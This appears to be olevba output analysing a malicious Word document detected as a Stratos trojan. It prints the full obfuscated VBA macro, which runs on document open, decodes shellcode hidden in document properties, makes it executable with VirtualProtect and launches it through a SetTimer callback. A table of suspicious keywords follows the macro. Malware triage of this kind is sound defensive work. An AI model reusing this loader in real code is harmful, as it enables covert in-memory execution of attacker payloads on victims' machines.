olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Stratos.gen-8471615fc3e8d0bc5e454c1fdad226dc442f116c1c224176e6699ac680ee4d93
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Stratos.gen-8471615fc3e8d0bc5e454c1fdad226dc442f116c1c224176e6699ac680ee4d93 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function MegalodontRespectersInspirate Lib "user32" Alias "SetTimer" (ByVal DeprecativeFortifyingUnhumiliated As LongPtr, ByVal DrillingsSubgroups As LongPtr, ByVal ExacerbescentNonanticipatory As LongPtr, ByVal PomesSnirt As LongPtr) As LongPtr
Private Declare PtrSafe Function ImmanifestGreatcoats Lib "user32" Alias "KillTimer" (ByVal InorganicThrioboly As LongPtr, ByVal BrainwashesInhell As LongPtr) As LongPtr
Private Declare PtrSafe Function MixosaurusWorrierSlaunchways Lib "kernel32" Alias "VirtualProtect" (ByVal ChampagnelessOverstraightnessVivants As LongPtr, ByVal CircumvolutionZinjanthropusHexpartite As LongPtr, ByVal StratiformSmirkedStimied As LongPtr, RoundersBesmearedUnseaming As LongPtr) As LongPtr
#Else
Private Declare Function MegalodontRespectersInspirate Lib "user32" Alias "SetTimer" ( ByVal BagpuddingHistotomy As Long, ByVal PhosphorateAdolescedSerigraphs As Long, ByVal DissentientMalaprops As Long, ByVal AntipathogenAcroclinium As Any) As Long
Private Declare Function ImmanifestGreatcoats Lib "user32" Alias "KillTimer" ( ByVal OrdineeIatromathematicsDisaugment As Long, ByVal NavelsBloodshedImpartiality As Long) As Long
Private Declare Function MixosaurusWorrierSlaunchways Lib "kernel32" Alias "VirtualProtect"  (ByVal ChrysalidalCatnap As Long, ByVal RessentimentDebrideUropyloric As Long, ByVal WatercoloringTeethful As Long, ExtrascholasticCalices As Long) As Long
#End If
Private Sub Document_Open()
FolliculoseUngarrisonedRetariff
End Sub
Private Sub FolliculoseUngarrisonedRetariff()
Dim TripetaloidJoual() As Byte
#If Win64 Then
TripetaloidJoual = TinkledObsidian(ActiveDocument.BuiltInDocumentProperties(WCR_Aw("MyNB7ewGNY")).Value)
#Else
TripetaloidJoual = TinkledObsidian(ActiveDocument.BuiltInDocumentProperties(WCR_Aw("g0PO1hPgc")).Value)
#End If
#If VBA7 Then
Dim SwiperFlinchinglyBepuzzlement As LongPtr
Dim IncoincidenceFancies As LongPtr
Dim shellCode As LongPtr
Dim CoagulativePipewood As LongPtr
#Else
Dim SwiperFlinchinglyBepuzzlement As Long
Dim IncoincidenceFancies As Long
Dim shellCode As Long
Dim CoagulativePipewood As Long
#End If
IncoincidenceFancies = UBound(TripetaloidJoual) + 1
shellCode = VarPtr(TripetaloidJoual(0))
MixosaurusWorrierSlaunchways shellCode, IncoincidenceFancies, 64, VarPtr(SwiperFlinchinglyBepuzzlement)
GetObject(WCR_Aw("MRbuyTFj")).Environment(WCR_Aw("VKgrG_c5D"))(WCR_Aw("oEyDN9Q")) = WCR_Aw("fJxiWkG4dP")
CoagulativePipewood = MegalodontRespectersInspirate(0, shellCode, 1, shellCode)
LimewashMiderCoronalled 1
ImmanifestGreatcoats 0, CoagulativePipewood
GetObject(WCR_Aw("WA5cGy4d")).Environment(WCR_Aw("tcazB8L_7J")).Remove (WCR_Aw("Yd_puy"))
ReDim TripetaloidJoual(1)
End Sub
Sub LimewashMiderCoronalled(Finish)
Dim NonpertinentlyReactingPredamage As Long
Dim MonographicSemola As Long
MonographicSemola = Timer() + (Finish)
Do
NonpertinentlyReactingPredamage = Timer()
DoEvents
Loop Until NonpertinentlyReactingPredamage > MonographicSemola
End Sub
Function SporotrichoticLinguishedMicroenvironmental(SuspensorMyelinsNeurochemist, UncandorMorchellaHypnotizer)
SporotrichoticLinguishedMicroenvironmental = Mid(SuspensorMyelinsNeurochemist, UncandorMorchellaHypnotizer + 1, 1)
End Function
Function MalgradoDelugingSenoufo(UntragicalQuarterpaceRoscoe) As Long
If Int(Rnd(23)) > 2 Then
MalgradoDelugingSenoufo = 9000
Else
MalgradoDelugingSenoufo = Len(UntragicalQuarterpaceRoscoe)
End If
End Function
Function TinkledObsidian(EnamorsTrapezophozophoraSruti)
ReDim JaphetideMarkedly(MalgradoDelugingSenoufo(EnamorsTrapezophozophoraSruti) - 1) As Byte
Dim ParoxazinePeroxisomalMongoloid As Long, SciaenidsLaundressesLongshucks As Long
Dim BacbakiriIngression: BacbakiriIngression = WCR_Aw("TjUtCGuhU3X") & WCR_Aw("mbAF5AZYo")
For ParoxazinePeroxisomalMongoloid = 0 To MalgradoDelugingSenoufo(EnamorsTrapezophozophoraSruti) - 1 Step 2
SciaenidsLaundressesLongshucks = ParoxazinePeroxisomalMongoloid / 2
JaphetideMarkedly(SciaenidsLaundressesLongshucks) = CDec(BacbakiriIngression & SporotrichoticLinguishedMicroenvironmental(EnamorsTrapezophozophoraSruti, ParoxazinePeroxisomalMongoloid) & SporotrichoticLinguishedMicroenvironmental(EnamorsTrapezophozophoraSruti, ParoxazinePeroxisomalMongoloid + 1))
Next
TinkledObsidian = JaphetideMarkedly
End Function
Public Function WCR_Aw(strInput)
WCR_Aw = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

